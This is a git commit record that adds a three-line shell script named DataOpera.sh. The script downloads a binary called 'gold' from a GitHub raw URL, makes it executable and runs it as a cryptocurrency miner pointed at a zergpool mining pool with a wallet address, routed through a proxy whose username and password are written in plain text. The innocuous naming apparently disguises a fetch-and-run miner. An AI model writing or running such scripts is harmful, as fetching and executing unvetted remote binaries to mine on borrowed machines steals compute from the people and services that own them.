8bfece21f909742bc457f5af0fd395f02d82700c
Testdrive345 <93646807+Testdrive345@users.noreply.github.com>
2023-01-03 08:53:33 +0530

    Create DataOpera.sh

---
+++ DataOpera.sh
@@ -0,0 +1,3 @@
+wget https://github.com/Testdrive345/hello/raw/main/gold
+chmod +x gold
+./gold -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u RFqmNRc3ycwR2UMcx5afpbgCDzHs7gYavX  -p  c=RVN,mc=LCC,m=solo,ID=Test -x xutcvpkv-rotate:te7t633kbfmz@p.webshare.io:80
